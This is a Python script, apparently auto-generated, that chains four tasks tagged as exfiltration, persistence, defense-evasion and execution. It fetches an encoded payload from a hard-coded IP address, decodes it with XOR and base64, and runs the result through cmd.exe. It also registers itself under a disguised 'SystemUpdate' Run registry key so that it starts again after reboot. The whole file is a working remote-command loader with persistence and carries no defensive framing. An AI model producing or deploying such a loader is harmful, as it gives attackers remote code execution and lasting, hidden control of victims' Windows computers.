#!/usr/bin/env python3
import sys
import json
import time
from typing import Dict, Any
import requests
import base64
import subprocess
import os

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    url = "https://192.168.1.100/configuration"

    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()

        content = b""
        for chunk in response.iter_content(8192):
            content += chunk

        if not content:
            raise ValueError("Downloaded content is empty")

        result = {
            "content": content.hex()
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        content = bytes.fromhex(input_data.get('content', ''))

        xor_key = 0xAA

        decoded_bytes = bytes(b ^ xor_key for b in content)

        decoded_content = base64.b64decode(decoded_bytes)

        result = {
            'decoded_content': decoded_content.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'decoded_content': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        decoded_content = bytes.fromhex(input_data.get('decoded_content', ''))

        command = decoded_content.decode('utf-8')

        result = subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True, timeout=30)

        executed = result.returncode == 0

        result_data = {'executed': executed}

        return {'success': True, 'data': result_data,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'executed': False},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        import winreg  # Moved import inside the function
        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key_name = 'SystemUpdate'

        exe_path = sys.executable if hasattr(sys, 'frozen') else os.path.abspath(sys.argv[0])

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)

            persisted_value, _ = winreg.QueryValueEx(key, key_name)
            persisted = persisted_value == exe_path

        result = {'persisted': persisted}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}}
    except Exception as e:
        return {'success': False, 'data': {'persisted': False}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time() - start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decode Configuration File [defense-evasion] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))